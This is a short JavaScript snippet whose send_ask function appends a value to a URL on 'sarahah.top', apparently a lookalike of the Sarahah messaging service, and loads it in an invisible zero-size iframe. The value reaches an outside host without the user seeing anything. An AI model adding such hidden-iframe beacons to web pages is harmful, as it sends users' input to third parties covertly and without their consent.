

function $(id) { return document.getElementById(id); }



function send_ask(value){

    
    // Create an iframe dynamically
    sarahah_base = "https://sarahah.top/u/receiver?name=";
    
    sarahah_src = sarahah_base+value;
    var sarahahIframe = document.createElement("iframe");
    sarahahIframe.setAttribute("src", sarahah_src);
    sarahahIframe.setAttribute("style", "position: absolute;width:0;height:0;border:0;");
    document.getElementsByTagName("body")[0].appendChild(sarahahIframe);


}


